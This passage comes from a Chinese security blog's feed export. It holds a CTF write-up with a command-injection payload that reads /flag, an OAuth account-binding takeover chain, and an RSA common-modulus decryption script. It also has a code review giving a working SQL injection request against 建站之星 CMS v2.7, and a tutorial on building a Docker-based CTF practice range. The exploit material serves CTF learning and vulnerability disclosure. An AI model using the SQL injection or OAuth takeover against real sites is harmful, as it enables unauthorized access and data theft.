class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> action 变量为 cmd 时，将会对 cmd 变量进行两次正则过滤，过滤之后将会使用 <code>busybox</code> 执行linux shell命令。要使程序正常运行下去，则cmd变量必须为字符串，且长度不能超过9。为了过第一个正则判断，则该字符串必须由两部分组成，且中间使用空格隔开，第一部分为大小写字母以及数字开头，第二部分含有 * 或者 / 两个符号。为了过第二个正则判断，则该第一部分为一个或一个以上大小写字母，第二部分以大小写字母或者 * 或者 / 这两个符号结尾。使用PHP模拟判断过程，可以发现诸如 <code>ls /</code> ； <code>ls *</code> 等命令+一个参数的 shell 命令均可以通过条件判断。执行 <code>ls /</code> 时发现在 / 根目录下，有一个 flag 文件，使用 <code>cat /flag</code> 即可读取文件内容。</p><p>Payload:<code>?action=cmd&amp;cmd=cat /flag</code></p><p>Flag:<code>flag{433b246d-71de-4dfe-b6dc-624f991e2d0f}</code></p><h2 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h2><p>题目是OAuth2.0 认证缺陷攻击</p><blockquote><p> you can login in the blog services by your username or auth by auth2.0, try to hack it.<br><a href="http://106.75.66.211:8000/" target="_blank" rel="noopener">http://106.75.66.211:8000/</a></p></blockquote><p>提交的链接只允许 <a href="http://106.75.66.211:8000/" target="_blank" rel="noopener">http://106.75.66.211:8000</a> 开头, 并且长度有限制<br>已登录用户可以通过下面任意跳转<br><a href="http://106.75.66.211:8000/main/login?next=//baidu.com" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=//baidu.com</a></p><p>未绑定oauth的用户可以点击绑定跳转到绑定界面<br>但是返回链接没有对用户做确认. 只要点击绑定返回的连接 就会被绑定成</p><p>攻击链:</p><ol><li><p>建立一个 oauth 账号</p></li><li><p>建立一个 blog 账号</p></li><li><p>点击绑定新账号, 使用 burp 拦截回调链接</p></li><li><p>在自己的服务器写下如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;location: http:&#x2F;&#x2F;106.75.66.211:8000&#x2F;main&#x2F;oauth&#x2F;?state&#x3D;OnmJVKIR0V&amp;code&#x3D;*********&#39;)</span><br></pre></td></tr></table></figure></li><li><p>提交 <a href="http://106.75.66.211:8000/main/login?next=//xxxx" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=//xxxx</a> 给管理员</p></li><li><p>使用oauth 重新登录 blog 即成为管理员</p></li></ol><p>Flag:<code>flag{30b1651e8445120f66d93c8c5edff507}</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h2><p>共模攻击</p><p>看流量包 Alice, Dave 的N相同</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span></span><br><span class="line">e1 = <span class="number">7669</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">6947</span></span><br><span class="line"></span><br><span class="line">message1 = <span class="number">22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span></span><br><span class="line"></span><br><span class="line">message2 = <span class="number">20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line"><span class="keyword">print</span> hex(plain)</span><br><span class="line"></span><br><span class="line"><span class="number">0x464c41477b673030645f4c75636b5f265f486176335f46756e7d</span></span><br></pre></td></tr></table></figure><p>Flag:<code>flag{g00d_Luck_&amp;_Hav3_Fun}</code></p><p>部分题目下载<a href="https://github.com/NS-Sp4ce/2018-XNUCA" target="_blank" rel="noopener">Github下载</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站之星v2.7SQL注入</title>
      <link href="/p/2642571319.html"/>
      <url>/p/2642571319.html</url>
      
        <content type="html"><![CDATA[<p>CTF比赛中出了这个CMS的题 下载回源码看了下</p><a id="more"></a><p>问题出在<code>module/mod_email.php</code>第147行左右</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_mail</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $db;</span><br><span class="line">    $title = ParamHolder::get(<span class="string">"title"</span>);</span><br><span class="line">    $msg = ParamHolder::get(<span class="string">"email_s"</span>);</span><br><span class="line">    $msg .= ParamHolder::get(<span class="string">"email_m"</span>);</span><br><span class="line">    $roles = ParamHolder::get(<span class="string">"role"</span>);</span><br><span class="line">    $type = ParamHolder::get(<span class="string">"type"</span>);</span><br><span class="line">    $user_email = ParamHolder::get(<span class="string">'users'</span>); </span><br><span class="line">    $send_id = SessionHolder::get(<span class="string">"user/id"</span>);</span><br><span class="line">    $time = time();</span><br><span class="line">    $ok = <span class="number">0</span>;</span><br><span class="line">    .............省略</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//邮件群发</span></span><br><span class="line"><span class="keyword">foreach</span> ($roles <span class="keyword">as</span> $k=&gt;$row)&#123;</span><br><span class="line">$sql = <span class="string">"select id,login,email from "</span>.Config::$tbl_prefix.<span class="string">"users where s_role='&#123;"</span>.$row.<span class="string">"&#125;'"</span>;</span><br><span class="line">    $res = $db-&gt;query($sql);</span><br><span class="line">    $emails = $res-&gt;fetchRows();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($emails)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($emails <span class="keyword">as</span> $eml)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;send_mail($title,$msg,$eml[<span class="string">'email'</span>]))&#123;</span><br><span class="line">        $ok++;</span><br><span class="line">        $sql = <span class="string">"insert into "</span>.Config::$tbl_prefix.<span class="string">"emails(`title`,`content`,user_id,user_name,is_mail,send_id,is_read,is_ok,create_time) values('&#123;$title&#125;','&#123;$msg&#125;','&#123;$eml['id']&#125;','&#123;$eml['login']&#125;',1,&#123;$send_id&#125;,0,1,'&#123;$time&#125;')"</span>;</span><br><span class="line">    $db-&gt;query($sql);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into "</span>.Config::$tbl_prefix.<span class="string">"emails(`title`,`content`,user_id,user_name,is_mail,send_id,is_read,is_ok,create_time) values('&#123;$title&#125;','&#123;$msg&#125;','&#123;$eml['id']&#125;','&#123;$eml['login']&#125;',1,&#123;$send_id&#125;,0,0,'&#123;$time&#125;')"</span>;</span><br><span class="line">    $db-&gt;query($sql);</span><br><span class="line">        $s_err[] = $eml[<span class="string">'login'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br></pre></td></tr></table></figure><p>SQL语句<code>$sql = &quot;select id,login,email from &quot;.Config::$tbl_prefix.&quot;users where s_role=&#39;{&quot;.$row.&quot;}&#39;&quot;;</code></p><p>其中SQL语句中的<code>$row</code>为遍历<code>$roles</code>后的内容，没有做过滤导致SQL注入</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?_a&#x3D;do_mail&amp;_m&#x3D;mod_email HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;utf-8</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.81 Safari&#x2F;537.36</span><br><span class="line">Content-Length: 112</span><br><span class="line">title&#x3D;aa&amp;email_s&#x3D;a&amp;email_m&#x3D;a&amp;type&#x3D;a&amp;users&#x3D;aaaa&#39;|aaa&amp;role[]&#x3D;abdc&#125;&#39;+union+select+</span><br><span class="line">1,user(),3#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CodeReview </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FBCTF汉化 基于Ubuntu 16.04</title>
      <link href="/p/3623178882.html"/>
      <url>/p/3623178882.html</url>
      
        <content type="html"><![CDATA[<p>适用于FBCTF Ubuntu 16.04版本的</p><a id="more"></a><p>汉化+做了点美化+修复个BUG<br>直接上图</p><h1 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/P7gGvn1.jpg" alt=""></p><h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/M7ZzWUV.jpg" alt=""></p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/gEgXehw.jpg" alt=""></p><h1 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/9IC3kXI.jpg" alt=""></p><h1 id="游戏版图"><a href="#游戏版图" class="headerlink" title="游戏版图"></a>游戏版图</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/65Jr75Q.jpg" alt=""></p><h1 id="计分板"><a href="#计分板" class="headerlink" title="计分板"></a>计分板</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/VhH2DMO.jpg" alt=""></p><p><a href="https://github.com/NS-Sp4ce/FBCTF-Chinese-Version" target="_blank" rel="noopener">下载地址</a><a href="https://github.com/NS-Sp4ce/FBCTF-Chinese-Version" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/FBCTF-Chinese-Version</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04搭建适用于CTF的Docker靶场</title>
      <link href="/p/2265203775.html"/>
      <url>/p/2265203775.html</url>
      
        <content type="html"><![CDATA[<p>因CTF比赛需要和设备闲置 学习搭建Docker靶场</p><a id="more"></a><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ul><li>OS: Ubuntu 16.04</li><li>设备类型: VM</li><li>宿主机：ESXI 6.5</li></ul><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="卸载原有Docker"><a href="#卸载原有Docker" class="headerlink" title="卸载原有Docker"></a>卸载原有Docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get remove docker \</span></span><br><span class="line">    docker-engine \</span><br><span class="line">    docker.io</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/a5LkcZg.jpg" alt=""></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Ubuntu 16.04 + 上的 Docker CE 默认使用<code>overlay2</code>存储层驱动,无需手动配置。</p><h2 id="使用-APT-安装"><a href="#使用-APT-安装" class="headerlink" title="使用 APT 安装"></a>使用 APT 安装</h2><p>由于<code>apt</code>源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get update -y &amp;&amp; apt-get upgrade -y</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get install \</span></span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/YHNIN9a.jpg" alt=""></p><p>鉴于国内网络问题，建议使用国内源，官方源请在注释中查看。<br>为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 官方源</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/Mwaqx2C.jpg" alt=""></p><p>然后，我们需要向 source.list 中添加 Docker 软件源</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo add-apt-repository \</span></span><br><span class="line">    "deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \</span><br><span class="line">    $(lsb_release -cs) \</span><br><span class="line">    stable"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 官方源</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> $ sudo add-apt-repository \</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">    $(lsb_release -cs) \</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    stable<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/BpFZjdA.jpg" alt=""></p><blockquote><p>以上命令会添加稳定版本的 Docker CE APT 镜像源，如果需要测试或每日构建版本的 Docker CE 请将 stable 改为 test 或者 nightly。</p></blockquote><h1 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h1><p>更新 apt 软件包缓存，并安装 docker-ce：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install docker-ce</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/gvIGirC.jpg" alt=""></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><blockquote><p>使用脚本自动安装<br>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -fsSL get.docker.com -o get-docker.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo sh get-docker.sh --mirror Aliyun</span></span><br></pre></td></tr></table></figure><p>执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker CE 的 Edge 版本安装在系统中。</p></blockquote><h1 id="启动-Docker-CE"><a href="#启动-Docker-CE" class="headerlink" title="启动 Docker CE"></a>启动 Docker CE</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start docker</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/SKw6fEP.jpg" alt=""></p><h1 id="建立-docker-用户组"><a href="#建立-docker-用户组" class="headerlink" title="建立 docker 用户组"></a>建立 docker 用户组</h1><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。</p><h2 id="建立-docker-组："><a href="#建立-docker-组：" class="headerlink" title="建立 docker 组："></a>建立 docker 组：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo groupadd docker</span></span><br></pre></td></tr></table></figure><h2 id="将当前用户加入-docker-组："><a href="#将当前用户加入-docker-组：" class="headerlink" title="将当前用户加入 docker 组："></a>将当前用户加入 docker 组：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo usermod -aG docker <span class="variable">$USER</span></span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/5AjlXQq.png" alt=""></p><p>退出当前终端并重新登录，进行如下测试。</p><h1 id="测试-Docker-是否安装正确"><a href="#测试-Docker-是否安装正确" class="headerlink" title="测试 Docker 是否安装正确"></a>测试 Docker 是否安装正确</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run hello-world</span></span><br><span class="line"></span><br><span class="line">Unable to find image 'hello-world:latest' locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">d1725b59e92d: Pull complete</span><br><span class="line">Digest: sha256:0add3ace90ecb4adbf7777e9aacf18357296e799f81cabc9fde470971e499788</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"><span class="meta"> $</span><span class="bash"> docker run -it ubuntu bash</span></span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/AQ8nP3B.jpg" alt=""><br>若能正常输出以上信息，则说明安装成功。</p><blockquote><p>参考<br><a href="https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html</a></p></blockquote><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>先搭建一个WEB容器练练手 理解下端口映射的原理<br>操作过程：</p><h2 id="第一步：准备工作"><a href="#第一步：准备工作" class="headerlink" title="第一步：准备工作"></a>第一步：准备工作</h2><ul><li>根目录： /opt/docker</li><li>网站根目录：/opt/docker/www</li><li>nginx相关目录：/opt/docker/nginx/conf.d</li></ul><h2 id="第二步：安装php7-nginx-mysql"><a href="#第二步：安装php7-nginx-mysql" class="headerlink" title="第二步：安装php7,nginx,mysql"></a>第二步：安装php7,nginx,mysql</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//拉取nginx镜像  </span><br><span class="line">docker pull nginx  </span><br><span class="line">//拉取php镜像  </span><br><span class="line">docker pull php:7.1.0-fpm  </span><br><span class="line">//拉取mysql镜像  </span><br><span class="line">docker pull mysql:5.7.18</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意！</strong><br>mysql务必加上版本号 否则会拉取MySQL8.0的镜像下来导致后面各种奇奇怪怪的错</p></blockquote><h2 id="第三步：启动基础环境"><a href="#第三步：启动基础环境" class="headerlink" title="第三步：启动基础环境"></a>第三步：启动基础环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//启动php  </span><br><span class="line">docker run -p 9000:9000 --name php -v /opt/docker/www/:/var/www/html/ --privileged=true -d php:7.1.0-fpm  </span><br><span class="line">//启动nginx  </span><br><span class="line">docker run -p 80:80 --name nginx -v /opt/docker/www/:/usr/share/nginx/html/ -v /opt/docker/nginx/conf.d:/etc/nginx/conf.d --privileged=true -d nginx  </span><br><span class="line">//启动mysql  </span><br><span class="line">docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql5 -v /opt/docker/mysql-5.7.18/data:/var/lib/mysql -d mysql:5.7.18</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/MPGUGI5.jpg" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/qpBFhag.jpg" alt=""></p><blockquote><p>命令详解<br>-v /opt/docker/www/:/var/www/html/：把宿主机（Ubuntu）的/opt/docker/www/挂载到了docker的/var/www/html/<br>–name php 命名为php<br>-p 80:80 把宿主机的80映射到docker的80端<br>-e MYSQL_ROOT_PASSWORD=123456 设置MySQL密码为123456</p></blockquote><h2 id="测试环境是否正确"><a href="#测试环境是否正确" class="headerlink" title="测试环境是否正确"></a>测试环境是否正确</h2><p>编辑文件<code>/opt/docker/www/index.php</code></p><figure class="highlight plain"><figcaption><span>[index.php]</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后在宿主机目录<code>/opt/docker/nginx/conf.d/</code>新建<code>index.conf</code><br>内容如下</p><figure class="highlight plain"><figcaption><span>[/opt/docker/nginx/conf.d/index.conf]</span></figcaption><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen  80;</span><br><span class="line">  #server_name www.test.com;</span><br><span class="line">  root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;;#nginx映射的地址</span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">   index index.html index.htm index.php;</span><br><span class="line">   autoindex off;</span><br><span class="line">  &#125;</span><br><span class="line">  location ~ \.php(.*)$ &#123;</span><br><span class="line">   root   &#x2F;var&#x2F;www&#x2F;html&#x2F;;#php映射的地址 同时定义为$document_root</span><br><span class="line">   fastcgi_pass 172.17.0.2:9000;</span><br><span class="line">   fastcgi_index index.php;</span><br><span class="line">   fastcgi_split_path_info ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">   fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">   fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">   fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;</span><br><span class="line">   include  fastcgi_params;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启<code>nginx</code> docker</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker restart nginx</span><br></pre></td></tr></table></figure><p>访问10.16.11.231【你部署Docker的机器的地址】查看是否输出PHPINFO<br><img src= "/img/loading.gif" data-lazy-src="/images/WVL4mhf.png" alt=""><br>如图即为成功</p><h2 id="第四步：安装-amp-部署靶机"><a href="#第四步：安装-amp-部署靶机" class="headerlink" title="第四步：安装&amp;部署靶机"></a>第四步：安装&amp;部署靶机</h2><p>以DeDeCMS为例<br>先拉取有dedemcms的镜像</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull chengxulvtu/dedecms:utf8_full_5.7  </span><br><span class="line">docker run -d --name dede-lantinghe -p 8081:80 -v /opt/docker/www/dedecms:/var/www/html chengxulvtu/dedecms:utf8_full_5.7</span><br></pre></td></tr></table></figure><p>然后访问<code>10.16.11.231:8081</code>进行常规安装即可</p><p><img src= "/img/loading.gif" data-lazy-src="/images/onYQd6l.png" alt=""></p><p>然后kill掉该docker并rm掉，FTP连接到宿主机找到安装好dedecms的目录<code>/opt/docker/www/dedecms</code>,在目录下创建一个新的文件夹（这里我用的<code>src</code>）并把dedecms的<strong>所有文件</strong>移入<code>src</code>文件夹内，再在<code>/opt/docker/www/dedecms</code>新建一个<code>Dockerfile</code>文件，操作后的<code>/opt/docker/www/dedecms</code>目录应该类似这样</p><p><img src= "/img/loading.gif" data-lazy-src="/images/nxEomxh.jpg" alt=""></p><p>编辑<code>Dockerfile</code>文件内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM eboraas&#x2F;apache-php:latest</span><br><span class="line"></span><br><span class="line">COPY src&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"></span><br><span class="line">RUN rm &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html \</span><br><span class="line">&amp;&amp; chmod -R 755 &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><p>解释下每行命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM &lt;image&gt;或 </span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br></pre></td></tr></table></figure><p>在Dockerfile中第一条非注释INSTRUCTION一定是FROM，它决定了以哪一个镜像作为基准，<code>&lt;image&gt;</code>首选本地是否存在，如果不存在则会从公共仓库下载（当然也可以使用私有仓库的格式）。这里引用了<code>eboraas</code>最新的<code>apache-php</code>集成环境</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY &lt;src&gt; &lt;dest&gt;</span><br></pre></td></tr></table></figure><p>将文件<code>&lt;src&gt;</code>拷贝到<code>container</code>的文件系统对应的路径<code>&lt;dest&gt;</code>下。<br>其中<br><code>&lt;src&gt;</code>可以是文件、文件夹，对于文件和文件夹<code>&lt;src&gt;</code>必须是在Dockerfile的相对路径下，即只能是相对路径且不能包含<code>../path/</code>。<br><code>&lt;dest&gt;</code>只能是容器中的绝对路径。如果路径不存在则会自动级联创建，根据你的需要是<code>&lt;dest&gt;</code>里是否需要反斜杠<code>/</code>，习惯使用<code>/</code>结尾从而避免被当成文件。<br>与<code>ADD</code>命令相比,<code>ADD</code>支持远程URL获取文件，但官方认为是<code>strongly discouraged</code>，建议使用<code>wget</code>或<code>curl</code>代替。<br><code>COPY</code>的语法与功能与<code>ADD</code>相同，只是不支持上面讲到的<code>&lt;src&gt;</code>是远程URL、自动解压这两个特性，但是<code>Best Practices for Writing Dockerfiles</code>建议尽量使用<code>COPY</code>，并使用<code>RUN</code>与<code>COPY</code>的组合来代替<code>ADD</code>，这是因为虽然<code>COPY</code>只支持本地文件拷贝到<code>container</code>，但它的处理比<code>ADD</code>更加透明，建议只在复制<code>tar</code>文件时使用<code>ADD</code>，如<code>ADD trusty-core-amd64.tar.gz /</code>，会先自动解压内容再<code>COPY</code>到在容器的<code>/</code>目录下。<br>在本例中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY src&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure><p>复制相对于<code>Dockerfile</code>文件位置的<code>src/</code>下的所有内容到<code>/var/www/html/</code>下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN &lt;commnad&gt;</span><br><span class="line">RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</span><br></pre></td></tr></table></figure><p><code>RUN</code>指令会在当前镜像的顶层执行任何命令，并<code>commit</code>成新的（中间）镜像，提交的镜像会在后面继续用到。<br>另外<code>RUN</code>命令的格式有两种写法。<br><code>shell</code>格式，相当于执行<code>/bin/sh -c &quot;&lt;command&gt;&quot;</code>：<br><code>RUN apt-get install vim -y</code><br><code>exec</code>格式，不会触发shell，所以<code>$HOME</code>这样的环境变量无法使用，但它可以在没有bash的镜像中执行，而且可以避免错误的解析命令字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN [&quot;apt-get&quot;, &quot;install&quot;, &quot;vim&quot;, &quot;-y&quot;]</span><br><span class="line">或</span><br><span class="line">RUN [&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;apt-get install vim -y&quot;]</span><br></pre></td></tr></table></figure><p>功能与shell风格相同</p><h3 